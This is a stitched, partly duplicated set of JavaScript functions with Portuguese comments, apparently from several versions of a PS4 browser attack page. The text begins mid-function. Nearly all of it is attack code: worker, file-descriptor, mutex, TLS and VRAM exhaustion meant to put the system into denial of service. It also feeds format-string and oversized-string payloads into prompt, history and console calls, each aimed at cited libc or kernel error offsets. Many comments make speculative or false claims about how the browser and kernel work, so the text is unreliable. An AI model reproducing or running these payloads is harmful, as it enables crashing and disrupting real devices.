                    fetch("/fd_test_" + count).catch(()=>{});
                    count++;
                    
                    // 3. WebSocket (1 Socket FD)
                    // const ws = new WebSocket("ws://127.0.0.1"); // Opcional, consome mais recurso
                    
                    if (count % 500 === 0) log(`Descritores abertos: ~${count}`);
                    
                } catch(e) {
                    // Se pegarmos o erro, sucesso!
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                    log("Sistema em estado de negação de serviço (IO).");
                }
            }, 1);
        }
// --- TESTE 1: Future 'Resource Error' Race ---
        // Alvo: Libc Offset 0xED3AA ("thread resource error")
        // Ocorre quando std::thread ou std::future falham ao alocar recursos.
        function runFutureLock() {
            log("[WebKit] Esgotando recursos de Thread/Future...");
            
            const workerCode = `
                onmessage = (e) => {
                    // Cria muitas Promises (que usam microtasks e recursos de async)
                    // Tenta forçar erro de recurso na criação de threads implícitas
                    const p = [];
                    for(let i=0; i<5000; i++) {
                        p.push(Promise.resolve(i).then(v => v*2));
                    }
                    Promise.all(p).then(() => postMessage("OK"));
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança o máximo de workers possível para consumir recursos de thread
            // O PS4 tem um limite baixo de threads por processo web.
            for(let i=0; i<30; i++) {
                try { new Worker(url).postMessage("go"); } catch(e) { log("Limite Workers atingido: " + e); break; }
            }
            log("Stress de Futures iniciado.");
        }

        // --- TESTE 2: gets_s Short Buffer Overflow ---
        // Alvo: Libc Offset 0xD80EC ("gets_s: short buffer")
        // gets_s é usado para ler input de usuário de forma segura, mas a string de erro sugere falha.
        function runGetsAttack() {
            log("[WebKit] Atacando gets_s via Prompt UI...");
            
            // Cria uma string gigante para injetar em qualquer campo de input
            const payload = "OVERFLOW_" + "A".repeat(8192); // 8KB
            
            try {
                // 'prompt' é uma das poucas funções síncronas que usa buffers de texto do sistema
                // Se o buffer interno for menor que o payload e a verificação falhar...
                log("Abrindo prompt... (Não digite nada, apenas feche se aparecer)");
                
                // Nota: O prompt bloqueia o JS, mas o estouro ocorre na preparação da janela
                const res = prompt("Injecting Payload...", payload);
                
                log("Prompt retornou (Seguro).");
            } catch(e) {
                log("Erro Prompt: " + e.message);
            }
        }

        // --- TESTE 3: strcat_s Bad Destination ---
        // Alvo: Libc Offset 0xD82E2 ("strcat_s: bad destination argument")
        function runStrcatBadDest() {
            log("[WebKit] Atacando strcat_s (Destination)...");
            
            // Tenta corromper a concatenação de strings na barra de título ou status
            const hugeTitle = "T".repeat(1024 * 100); // 100KB
            
            try {
                // Definir document.title força uma cópia para o processo da UI
                // Se o buffer de destino for inválido ou pequeno...
                document.title = hugeTitle;
                
                // Tenta também History API que concatena URLs
                history.replaceState(null, hugeTitle, "#" + hugeTitle);
                
                log("Strings enviadas ao sistema.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 4: OpenSSL Rand Mutex Deadlock ---
        // Alvo: Kernel Offset 0xB3480E ("openssl:stl_wrapper.c:_rand_mtx_lock()")
        // O log mostra que o OpenSSL usa um wrapper STL com mutex para números aleatórios.
        function runCryptoLock() {
            log("[KERNEL] Atacando OpenSSL Mutex...");
            
            if (!window.crypto) return log("Crypto off.");
            
            const workerCode = `
                onmessage = () => {
                    const buf = new Uint8Array(4096);
                    // Loop infinito de pedidos de entropia
                    // Martela o _rand_mtx_lock encontrado no log
                    while(true) {
                        crypto.getRandomValues(buf);
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // 20 Workers competindo pelo MESMO mutex global do OpenSSL no Kernel
            for(let i=0; i<20; i++) new Worker(url).postMessage("start");
            
            log("20 Workers em contenção no OpenSSL.");
        }

        // --- TESTE 5: scePthreadSetspecific Memory Error ---
        // Alvo: Libkernel Offset 0x41B09 ("scePthreadSetspecific Internal Memory Error")
        // Isso refere-se ao TLS (Thread Local Storage).
        function runTLSCrash() {
            log("[KERNEL] Esgotando Thread Local Storage (TLS)...");
            
            // Intl (Internacionalização) usa TLS intensivamente para cache de locale
            const workerCode = `
                onmessage = () => {
                    try {
                        const formatters = [];
                        // Cria milhares de formatadores únicos
                        // Cada um pode alocar slots no TLS ou heap associado à thread
                        for(let i=0; i<5000; i++) {
                            // Locale complexo para forçar alocação
                            formatters.push(new Intl.DateTimeFormat('en-u-ca-buddhist-nu-thai', {timeZone: 'UTC'}));
                        }
                    } catch(e) {}
                    // Morre com recursos alocados
                    close(); 
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Ciclo rápido de criação/destruição de threads com carga de TLS
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) new Worker(url).postMessage("go");
                count += 10;
                if (count % 500 === 0) log(`Ciclos TLS: ${count}`);
                if (count > 10000) clearInterval(interval);
            }, 50);
        }

        // --- TESTE 6: 'Too Many Files' FD Exhaustion ---
        // Alvo: Libc Offset 0xEE48A ("too many files open")
        // Queremos atingir esse erro exato para provar a exaustão.
        function runFDSlam() {
            log("[KERNEL] Iniciando FD Grand Slam...");
            
            const resources = [];
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // 1. MessageChannel (2 FDs cada)
                    const mc = new MessageChannel();
                    resources.push(mc);
                    count += 2;
                    
                    // 2. Fetch (1 Socket FD) - Mantém conexão aberta
                    fetch("/fd_test_" + count).catch(()=>{});
                    count++;
                    
                    // 3. WebSocket (1 Socket FD)
                    // const ws = new WebSocket("ws://127.0.0.1"); // Opcional, consome mais recurso
                    
                    if (count % 500 === 0) log(`Descritores abertos: ~${count}`);
                    
                } catch(e) {
                    // Se pegarmos o erro, sucesso!
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                    log("Sistema em estado de negação de serviço (IO).");
                }
            }, 1);
        }
 // --- TESTE 1: TLS 'alloca' Stack Clash ---
        // Alvo: "allocate_tls_block_to_dtv" com trigger "alloca".
        // Tenta colidir a stack com o bloco TLS recém alocado.
        function runTLSStackSmash() {
            log("[WebKit] Iniciando TLS Stack Clash...");
            
            const workerCode = `
                onmessage = () => {
                    // Intl usa muito TLS (Thread Local Storage) para cache
                    const formatters = [];
                    // Aloca TLS
                    for(let i=0; i<100; i++) formatters.push(new Intl.NumberFormat('en'+i));
                    
                    // Agora expande a stack violentamente para tentar atingir o TLS
                    function smash(depth) {
                        const junk = new Float64Array(100); // Aloca na stack
                        if (depth > 0) smash(depth - 1);
                        else postMessage("Stack Limit Hit");
                    }
                    try { smash(10000); } catch(e) { postMessage("Erro: " + e); }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança workers para criar pressão no TLS
            for(let i=0; i<10; i++) new Worker(url).postMessage("go");
            log("Workers atacando TLS/Stack boundary.");
        }

        // --- TESTE 2: CodeBlock Profile Allocation Overflow ---
        // Alvo: "JSC::UnlinkedCodeBlock::allocateSharedProfiles".
        // Tenta estourar a alocação de perfis de código compilado.
        function runProfileOverflow() {
            log("[WebKit] Gerando função massiva (Profile Overflow)...");
            
            try {
                // Cria uma função com milhares de argumentos
                // O WebKit aloca estruturas de perfil para cada argumento/variável
                const args = Array.from({length: 2000}, (_, i) => "a" + i).join(",");
                const body = "return " + Array.from({length: 2000}, (_, i) => "a" + i).join("+") + ";";
                
                log("Compilando função...");
                const massiveFunc = new Function(args, body);
                
                log("Executando para gerar perfil...");
                // Chama com zeros
                const callArgs = new Array(2000).fill(1);
                massiveFunc(...callArgs);
                
                log("Função executada (Profile Alloc Seguro).");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Socket 'Already Connected' Race ---
        // Alvo: "connection already in progress".
        // Tenta confundir a máquina de estados do socket.
        function runSocketRace() {
            log("[WebKit] Iniciando Socket State Race...");
            
            const url = "wss://echo.websocket.org";
            let ws = new WebSocket(url);
            
            // Tenta fechar e reabrir/enviar muito rápido
            const interval = setInterval(() => {
                try {
                    // Estado CONNECTING (0)
                    if (ws.readyState === 0) {
                        // Tenta enviar antes de abrir (deve falhar, mas estressa o check)
                        ws.send("Race");
                        // Fecha imediatamente
                        ws.close();
                    } else {
                        // Recria
                        ws = new WebSocket(url);
                    }
                } catch(e) {}
            }, 1); // 1ms
            
            setTimeout(() => {
                clearInterval(interval);
                log("Socket Race finalizada.");
            }, 3000);
        }

        // --- TESTE 4: Thread Red Zone Allocation Failure ---
        // Alvo: "Cannot allocate red zone for initial thread".
        // Tenta criar threads tão rápido que o kernel falha ao proteger a stack.
        function runRedZoneFail() {
            log("[KERNEL] Esgotando Red Zones (Thread init)...");
            
            const workerCode = `onmessage=()=>{}`;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            const interval = setInterval(() => {
                // Cria e mata imediatamente
                // O Kernel tenta alocar a stack e a red zone
                const w = new Worker(url);
                w.terminate(); 
                
                count++;
                if (count % 100 === 0) log(`Threads iniciadas/mortas: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("Teste RedZone finalizado.");
                }
            }, 5);
        }

        // --- TESTE 5: Kernel Memory Leak Trigger ---
        // Alvo: "Warning: memory type %s leaked memory on destroy".
        // Cria objetos IPC, entrelaça-os e abandona-os para forçar leak no destroy.
        function runKernelLeak() {
            log("[KERNEL] Tentando Trigger de Memory Leak...");
            
            const channel = new MessageChannel();
            // Cria um arraybuffer grande para associar ao canal
            const bigBuf = new ArrayBuffer(1024 * 1024); // 1MB
            
            // Envia porta para si mesma (Ciclo no Kernel) com dados
            channel.port1.postMessage({buf: bigBuf}, [channel.port2, bigBuf]);
            
            // Perde todas as referências JS
            // O Kernel tem que destruir o canal e o buffer.
            // Se a lógica de ciclo falhar, o aviso de leak dispara (e a memória vaza).
            
            // Repete em loop
            const interval = setInterval(() => {
                const c = new MessageChannel();
                try {
                    c.port1.postMessage("leak", [c.port2]);
                } catch(e){}
            }, 10);
            
            setTimeout(() => {
                clearInterval(interval);
                log("Leak trigger tentado. Verifique memória do sistema.");
            }, 5000);
        }

        // --- TESTE 6: 'Could not allocate' Stress ---
        // Alvo: "Could not allocate %u bytes" (Kernel).
        // Força falha de alocação contígua no Kernel.
        function runAllocFail() {
            log("[KERNEL] Estressando Alocador Contíguo...");
            
            const bigData = new Uint8Array(10 * 1024 * 1024).fill(0x41); // 10MB
            
            // Tenta enviar payloads gigantes via postMessage (cópia no Kernel)
            // Até o Kernel dizer "Não".
            const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    w.postMessage(bigData); // Clona 10MB no Kernel space
                    count++;
                    if (count % 10 === 0) log(`Enviado: ${count * 10} MB`);
                } catch(e) {
                    log("Kernel recusou alocação: " + e.message);
                    clearInterval(interval);
                }
            }, 100);
        }
// --- TESTE 1: CodeBlock Profile Alloc Overflow ---
        // Alvo: JSC::UnlinkedCodeBlock::allocateSharedProfiles
        // Cria uma função com 10.000 argumentos para forçar uma alocação gigante de metadados.
        function runProfileFlood() {
            log("[WebKit] Iniciando Profile Alloc Overflow...");
            
            try {
                // Gera string de argumentos: "a0,a1,a2...a9999"
                const args = Array.from({length: 10000}, (_, i) => "a" + i).join(",");
                const body = "return 1;";
                
                log("Compilando função monstruosa...");
                // O parser JSC tem de alocar perfis de tipo para cada argumento
                const f = new Function(args, body);
                
                log("Função criada. Executando...");
                f();
                
                log("JSC sobreviveu.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: JSC Rope String Flatten Crash ---
        // Alvo: op_strcat (Concatenação preguiçosa)
        // O JSC usa "Rope Strings" (árvores de strings) para otimizar concatenação.
        // Forçar a "aplanagem" (flatten) de uma Rope gigante pode estourar o heap ou stack.
        function runRopeFlatten() {
            log("[WebKit] Criando Rope String gigante...");
            
            try {
                let s = "X";
                // Cria uma árvore binária de concatenações profundas
                // 2^25 chars = 32MB, mas a profundidade da árvore é o problema
                for(let i=0; i<25; i++) {
                    s = s + s; 
                }
                
                log("Rope criada. Forçando Flatten (acesso a char)...");
                // Acessar um caractere força o motor a resolver a árvore inteira
                const c = s[s.length - 1];
                
                log("Flatten OK. Char: " + c);
            } catch(e) {
                log("Erro Rope: " + e.message);
            }
        }

        // --- TESTE 3: gets_s Zero Buffer Trigger ---
        // Alvo: gets_s: zero buffer size
        // Tenta usar APIs que leem streams em buffers de tamanho 0.
        function runZeroBuffer() {
            log("[WebKit] Testando Zero Buffer Read...");
            
            if (!window.ReadableStream) return log("Streams API off.");
            
            const rs = new ReadableStream({
                start(c) {
                    c.enqueue(new Uint8Array([65, 66, 67]));
                    c.close();
                }
            });
            
            const reader = rs.getReader({mode: "byob"});
            // Buffer de tamanho ZERO
            const buf = new ArrayBuffer(0); 
            const view = new Uint8Array(buf);
            
            // O padrão diz que deve ler 0 bytes, mas a libc do PS4 (gets_s) pode pânico?
            reader.read(view).then(r => {
                log("Leitura zero completa (Seguro).");
            }).catch(e => {
                log("Erro Zero Read: " + e.message);
            });
        }

        // --- TESTE 4: OpenSSL Mutex Unlock Deadlock ---
        // Alvo: openssl:stl_wrapper.c:_rand_mtx_unlock()
        // Tenta matar a thread ENQUANTO ela está dentro da função crypto, segurando o lock.
        function runCryptoDeadlock() {
            log("[KERNEL] Atacando OpenSSL Mutex Unlock...");
            
            if (!window.crypto) return log("Crypto off.");
            
            const workerCode = `
                onmessage = () => {
                    const buf = new Uint8Array(1024*1024); // 1MB para demorar mais
                    // Loop infinito de crypto
                    while(true) crypto.getRandomValues(buf);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            const interval = setInterval(() => {
                const w = new Worker(url);
                w.postMessage("start");
                
                // Tenta acertar o timing onde o lock está adquirido
                // Terminate força a morte da thread. O Kernel limpa o mutex?
                setTimeout(() => w.terminate(), Math.random() * 20);
                
                count++;
                if (count % 10 === 0) log(`Tentativas de Deadlock: ${count}`);
                if (count > 200) {
                    clearInterval(interval);
                    log("Teste Crypto finalizado.");
                }
            }, 50);
        }

        // --- TESTE 5: TLS Block Allocation Exhaustion ---
        // Alvo: allocate_tls_block_to_dtv
        // Esgota a memória para Thread Local Storage.
        function runTLSBlock() {
            log("[KERNEL] Esgotando Blocos TLS...");
            
            // Intl.NumberFormat aloca cache em TLS
            const workerCode = `
                onmessage = () => {
                    const cache = [];
                    try {
                        for(let i=0; i<10000; i++) {
                            // Criação massiva de objetos dependentes de locale
                            cache.push(new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }));
                        }
                    } catch(e) {}
                    // Mantém vivo
                    setInterval(()=>{}, 1000);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança workers até o limite
            for(let i=0; i<50; i++) {
                new Worker(url).postMessage("go");
            }
            log("50 Workers alocando TLS massivo.");
        }

        // --- TESTE 6: Stack Red Zone Bypass ---
        // Alvo: Cannot allocate red zone for initial thread
        // Tenta pular a página de proteção da pilha (Red Zone) com alocações grandes.
        function runStackRedZone() {
            log("[KERNEL] Tentando Stack Red Zone Bypass...");
            
            const workerCode = `
                function recurse(depth) {
                    // Aloca array grande na STACK (não heap)
                    // Tenta pular a 'Red Zone' (geralmente 4KB ou 16KB)
                    // Se pularmos a guarda, escrevemos na memória de outra thread/kernel
                    const largeStackVar = new Float64Array(2048); // ~16KB
                    largeStackVar.fill(Math.random());
                    
                    if (depth > 0) recurse(depth - 1);
                }
                onmessage = () => {
                    try { recurse(1000); } catch(e) {}
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<10; i++) new Worker(url).postMessage("go");
            log("Workers a martelar a Stack Boundary.");
        }
 // --- TESTE 1: sprintf_s Bad Format Argument ---
        // Alvo: "sprintf_s: bad format argument"
        // Tenta passar um objeto que falha durante a conversão de string dentro do formatador.
        function runBadFormat() {
            log("[WebKit] Atacando sprintf_s (Bad Arg)...");
            
            const badObj = {
                toString: function() {
                    // Retorna outra string gigante ou lança erro
                    return "A".repeat(10000); 
                }
            };
            
            // Cria ciclo recursivo
            const recursiveObj = {};
            recursiveObj.self = recursiveObj;
            recursiveObj.toString = function() { return this.self; }; // Recursão infinita
            
            try {
                // console.log usa sprintf internamente para %s e %o
                // Tenta confundir o formatador com tipos instáveis
                console.log("Teste: %s %d %f", badObj, recursiveObj, NaN);
                console.warn("Recursive: %s", recursiveObj);
                
                log("Console sobreviveu.");
            } catch(e) {
                log("Erro (JS Catch): " + e.message);
            }
        }

        // --- TESTE 2: strcat_s Buffer Too Small ---
        // Alvo: "strcat_s: buffer too small"
        // Usa History API que concatena Base URL + Path + Hash.
        function runStrcatSmall() {
            log("[WebKit] Atacando strcat_s (Buffer Size)...");
            
            // Cria um título de estado gigante.
            // O sistema pode tentar concatenar "Title: " + "A..." num buffer fixo para a UI.
            const overflow = "X".repeat(65000); 
            
            try {
                log("Enviando título gigante para History...");
                history.replaceState(null, overflow, null);
                
                // Tenta ler de volta para ver se corrompeu ou truncou
                if (document.title !== overflow) {
                    log("Título truncado ou ignorado (Seguro).");
                }
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Momentum Event Logic Race ---
        // Alvo: "Generate momentum events in WebKit..."
        // Tenta criar conflito entre o scroll do sistema e o do WebKit.
        function runMomentumRace() {
            log("[WebKit] Iniciando Momentum Race...");
            const div = document.getElementById('scroll-dummy');
            
            let toggle = false;
            let i = 0;
            const interval = setInterval(() => {
                // Alterna violentamente entre scroll nativo e hidden
                // Enquanto forçamos scroll via JS
                div.style.overflowY = toggle ? 'scroll' : 'hidden';
                div.scrollTop = toggle ? 0 : 1000;
                
                // Dispara eventos de roda do mouse sintéticos
                div.dispatchEvent(new WheelEvent('wheel', {deltaY: 100}));
                
                toggle = !toggle;
                i++;
                
                if (i > 500) {
                    clearInterval(interval);
                    log("Momentum Race finalizada.");
                }
            }, 10);
        }

        // --- TESTE 4: Thread Leftover Data Leak ---
        // Alvo: "Thread %p has exited with leftover thread-specific data"
        // Isso confirma que o Kernel tem dificuldade em limpar TLS complexo.
        function runTLSLeak() {
            log("[KERNEL] Iniciando TLS Data Leak...");
            
            const workerCode = `
                onmessage = () => {
                    // Intl.DateTimeFormat aloca dados de locale no TLS da thread
                    const d = new Intl.DateTimeFormat('ja-JP-u-ca-japanese');
                    // Formata algo para garantir cache
                    d.format(new Date());
                    
                    // Termina abruptamente sem dar chance de limpeza JS
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Cria e mata threads rapidamente.
            // O Kernel vai acumular avisos de "leftover data" e vazar memória.
            let count = 0;
            const interval = setInterval(() => {
                for(let k=0; k<10; k++) {
                    new Worker(url).postMessage("go");
                }
                count += 10;
                if(count % 500 === 0) log(`Threads vazadas: ${count}`);
                
                if(count > 10000) {
                    clearInterval(interval);
                    log("Teste TLS Leak finalizado.");
                }
            }, 20);
        }

        // --- TESTE 5: HMD 'Already Connected' Race ---
        // Alvo: "HMD HID COMMAND is already connected"
        // Tenta confundir o estado do driver HMD/VR.
        function runHMDState() {
            log("[KERNEL] Atacando Estado HMD/VR...");
            
            if (navigator.getVRDisplays) {
                // Loop de polling de VR
                // Tenta "conectar" ao driver repetidamente
                const interval = setInterval(() => {
                    navigator.getVRDisplays();
                    // Se houver API de gamepad, usa também
                    if(navigator.getGamepads) navigator.getGamepads();
                }, 1);
                
                setTimeout(() => {
                    clearInterval(interval);
                    log("HMD Race finalizada.");
                }, 5000);
            } else {
                log("WebVR API não disponível.");
            }
        }

        // --- TESTE 6: Kernel Large Alloc Fail ---
        // Alvo: "Could not allocate %u bytes"
        // Tenta forçar a falha de alocação no Kernel Graphics Driver.
        function runHugeAlloc() {
            log("[KERNEL] Forçando Alocação Gigante (VRAM)...");
            
            try {
                // Tenta criar um ImageBitmap gigante
                // 32767x32767 pixels x 4 bytes = ~4GB
                // O Kernel deve recusar, mas se tentar alocar e falhar mal...
                const canvas = new OffscreenCanvas(32767, 32767); 
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = 'red';
                ctx.fillRect(0,0,1,1); // Força alocação real
                
                log("Canvas Gigante criado (Surpreendente!).");
            } catch(e) {
                log("Alocação recusada (Esperado): " + e.message);
            }
            
            // Tenta criar múltiplos menores para fragmentar
            const arr = [];
            try {
                for(let i=0; i<100; i++) {
                    arr.push(new OffscreenCanvas(4096, 4096)); // 64MB cada
                }
                log("Fragmentação VRAM iniciada.");
            } catch(e) {
                log("OOM VRAM atingido.");
            }
        }
// --- TESTE 1: sprintf_s Bad Format Argument ---
        // Alvo: "sprintf_s: bad format argument"
        // Tenta passar um objeto que falha durante a conversão de string dentro do formatador.
        function runBadFormat() {
            log("[WebKit] Atacando sprintf_s (Bad Arg)...");
            
            const badObj = {
                toString: function() {
                    // Retorna outra string gigante ou lança erro
                    return "A".repeat(10000); 
                }
            };
            
            // Cria ciclo recursivo
            const recursiveObj = {};
            recursiveObj.self = recursiveObj;
            recursiveObj.toString = function() { return this.self; }; // Recursão infinita
            
            try {
                // console.log usa sprintf internamente para %s e %o
                // Tenta confundir o formatador com tipos instáveis
                console.log("Teste: %s %d %f", badObj, recursiveObj, NaN);
                console.warn("Recursive: %s", recursiveObj);
                
                log("Console sobreviveu.");
            } catch(e) {
                log("Erro (JS Catch): " + e.message);
            }
        }

        // --- TESTE 2: strcat_s Buffer Too Small ---
        // Alvo: "strcat_s: buffer too small"
        // Usa History API que concatena Base URL + Path + Hash.
        function runStrcatSmall() {
            log("[WebKit] Atacando strcat_s (Buffer Size)...");
            
            // Cria um título de estado gigante.
            // O sistema pode tentar concatenar "Title: " + "A..." num buffer fixo para a UI.
            const overflow = "X".repeat(65000); 
            
            try {
                log("Enviando título gigante para History...");
                history.replaceState(null, overflow, null);
                
                // Tenta ler de volta para ver se corrompeu ou truncou
                if (document.title !== overflow) {
                    log("Título truncado ou ignorado (Seguro).");
                }
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Momentum Event Logic Race ---
        // Alvo: "Generate momentum events in WebKit..."
        // Tenta criar conflito entre o scroll do sistema e o do WebKit.
        function runMomentumRace() {
            log("[WebKit] Iniciando Momentum Race...");
            const div = document.getElementById('scroll-dummy');
            
            let toggle = false;
            let i = 0;
            const interval = setInterval(() => {
                // Alterna violentamente entre scroll nativo e hidden
                // Enquanto forçamos scroll via JS
                div.style.overflowY = toggle ? 'scroll' : 'hidden';
                div.scrollTop = toggle ? 0 : 1000;
                
                // Dispara eventos de roda do mouse sintéticos
                div.dispatchEvent(new WheelEvent('wheel', {deltaY: 100}));
                
                toggle = !toggle;
                i++;
                
                if (i > 500) {
                    clearInterval(interval);
                    log("Momentum Race finalizada.");
                }
            }, 10);
        }

        // --- TESTE 4: Thread Leftover Data Leak ---
        // Alvo: "Thread %p has exited with leftover thread-specific data"
        // Isso confirma que o Kernel tem dificuldade em limpar TLS complexo.
        function runTLSLeak() {
            log("[KERNEL] Iniciando TLS Data Leak...");
            
            const workerCode = `
                onmessage = () => {
                    // Intl.DateTimeFormat aloca dados de locale no TLS da thread
                    const d = new Intl.DateTimeFormat('ja-JP-u-ca-japanese');
                    // Formata algo para garantir cache
                    d.format(new Date());
                    
                    // Termina abruptamente sem dar chance de limpeza JS
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Cria e mata threads rapidamente.
            // O Kernel vai acumular avisos de "leftover data" e vazar memória.
            let count = 0;
            const interval = setInterval(() => {
                for(let k=0; k<10; k++) {
                    new Worker(url).postMessage("go");
                }
                count += 10;
                if(count % 500 === 0) log(`Threads vazadas: ${count}`);
                
                if(count > 10000) {
                    clearInterval(interval);
                    log("Teste TLS Leak finalizado.");
                }
            }, 20);
        }

        // --- TESTE 5: HMD 'Already Connected' Race ---
        // Alvo: "HMD HID COMMAND is already connected"
        // Tenta confundir o estado do driver HMD/VR.
        function runHMDState() {
            log("[KERNEL] Atacando Estado HMD/VR...");
            
            if (navigator.getVRDisplays) {
                // Loop de polling de VR
                // Tenta "conectar" ao driver repetidamente
                const interval = setInterval(() => {
                    navigator.getVRDisplays();
                    // Se houver API de gamepad, usa também
                    if(navigator.getGamepads) navigator.getGamepads();
                }, 1);
                
                setTimeout(() => {
                    clearInterval(interval);
                    log("HMD Race finalizada.");
                }, 5000);
            } else {
                log("WebVR API não disponível.");
            }
        }

        // --- TESTE 6: Kernel Large Alloc Fail ---
        // Alvo: "Could not allocate %u bytes"
        // Tenta forçar a falha de alocação no Kernel Graphics Driver.
        function runHugeAlloc() {
            log("[KERNEL] Forçando Alocação Gigante (VRAM)...");
            
            try {
                // Tenta criar um ImageBitmap gigante
                // 32767x32767 pixels x 4 bytes = ~4GB
                // O Kernel deve recusar, mas se tentar alocar e falhar mal...
                const canvas = new OffscreenCanvas(32767, 32767); 
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = 'red';
                ctx.fillRect(0,0,1,1); // Força alocação real
                
                log("Canvas Gigante criado (Surpreendente!).");
            } catch(e) {
                log("Alocação recusada (Esperado): " + e.message);
            }
            
            // Tenta criar múltiplos menores para fragmentar
            const arr = [];
            try {
                for(let i=0; i<100; i++) {
                    arr.push(new OffscreenCanvas(4096, 4096)); // 64MB cada
                }
                log("Fragmentação VRAM iniciada.");
            } catch(e) {
                log("OOM VRAM atingido.");
            }
        }
 // --- TESTE 1: JSC::CompleteSubspace::allocateSlow ---
        // Alvo: Forçar o caminho lento de alocação no JSC para expor bugs de gestão de memória.
        function runAllocSlow() {
            log("[WebKit] Forçando Alocação Lenta (Subspace Fragmentation)...");
            
            const arr = [];
            try {
                // Cria objetos de tamanhos variados para fragmentar as "Subspaces" do Heap
                for(let i=0; i<50000; i++) {
                    // Objetos pequenos, médios e grandes misturados
                    if (i % 3 === 0) arr.push({a:1}); 
                    else if (i % 3 === 1) arr.push({a:1, b:2, c:3, d:4, e:5});
                    else arr.push(new Array(100).fill(1));
                    
                    // Liberta buracos aleatórios para fragmentar
                    if (i % 5 === 0) arr[i-1] = null;
                }
                
                log("Heap Fragmentado. Forçando alocação crítica...");
                
                // Agora tenta alocar massivamente para forçar o 'allocateSlow'
                const stress = [];
                for(let i=0; i<10000; i++) stress.push(new Float64Array(64));
                
                log("Alocação completa (Seguro).");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: System Console Injection ---
        // Alvo: "Log page messages to system console"
        // Tenta injetar caracteres de controle ou formatadores no log do sistema.
        function runConsoleInject() {
            log("[WebKit] Injetando no Log do Sistema...");
            
            // Strings perigosas para logs C (Format String, Newlines, Nulls)
            const payloads = [
                "%x %x %x %x", // Format String clássico
                "\n\n[KERNEL PANIC]\n\n", // Spoofing de log
                "A".repeat(2048), // Buffer overflow simples
                "\x00\x00\x00" // Null bytes
            ];
            
            payloads.forEach(p => {
                console.log("INJECT:", p);
                console.warn("WARN:", p);
                console.error("ERR:", p);
            });
            
            log("Payloads enviados para o syslog.");
        }

        // --- TESTE 3: WTF::AutomaticThread Exhaustion ---
        // Alvo: "WTF::AutomaticThread" (Template de threads do WebKit)
        // Tenta esgotar o pool de threads automáticas usadas por APIs auxiliares.
        function runAutoThread() {
            log("[WebKit] Esgotando AutomaticThreads...");
            
            // Image.decode() usa threads de background do WebKit
            const promises = [];
            const blob = new Blob(["fake_image_data"], {type: "image/png"});
            const url = URL.createObjectURL(blob); // URL inválida, mas dispara a thread
            
            for(let i=0; i<1000; i++) {
                const img = new Image();
                img.src = url;
                // Dispara decode em paralelo
                promises.push(img.decode().catch(()=>{}));
            }
            
            // Crypto também usa threads
            if(window.crypto && window.crypto.subtle) {
                for(let i=0; i<500; i++) {
                    promises.push(crypto.subtle.digest("SHA-256", new Uint8Array(10)).catch(()=>{}));
                }
            }
            
            Promise.all(promises).then(() => log("Threads retornaram (Seguro)."));
            log("1500 Tarefas de thread disparadas.");
        }

        // --- TESTE 4: [ScePthread] abort() Trigger ---
        // Alvo: "[ScePthread] abort() is called."
        // Tenta colocar uma thread num estado irrecuperável que force o aborto.
        function runPthreadAbort() {
            log("[KERNEL] Tentando Trigger Pthread Abort...");
            
            if (!window.SharedArrayBuffer) return log("SAB off.");
            
            const sab = new SharedArrayBuffer(4);
            const view = new Int32Array(sab);
            
            const workerCode = `
                function recurse(depth) {
                    // 1. Enche a stack profundamente
                    if (depth > 0) recurse(depth - 1);
                    else {
                        // 2. No fundo da stack, entra em espera atómica (Kernel Wait)
                        const view = new Int32Array(self.sab);
                        Atomics.wait(view, 0, 0); 
                    }
                }
                onmessage = (e) => {
                    self.sab = e.data;
                    try { recurse(2000); } catch(x){}
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança worker
            const w = new Worker(url);
            w.postMessage(sab);
            
            // Espera a thread entrar em 'wait' profundo
            setTimeout(() => {
                log("Matando thread em deep stack wait...");
                // 3. Termina violentamente.
                // O Kernel tem de desenrolar a stack e cancelar o wait. Se falhar -> abort()
                w.terminate();
            }, 1000);
        }

        // --- TESTE 5: Can't open console (Resource Starvation) ---
        // Alvo: "Can't open console"
        // Tenta impedir que o Kernel abra seu próprio dispositivo de log.
        function runConsoleOpenFail() {
            log("[KERNEL] Starving Console Device...");
            
            // 1. Esgota File Descriptors
            const fds = [];
            const interval = setInterval(() => {
                try {
                    fds.push(new MessageChannel());
                } catch(e) {
                    clearInterval(interval);
                    log("FDs esgotados. Iniciando spam de log...");
                    
                    // 2. Com FDs esgotados, força o sistema a tentar abrir /dev/console
                    // para reportar erros ou logs
                    for(let i=0; i<100; i++) console.error("FORCE_OPEN_CONSOLE_" + i);
                }
            }, 1);
        }

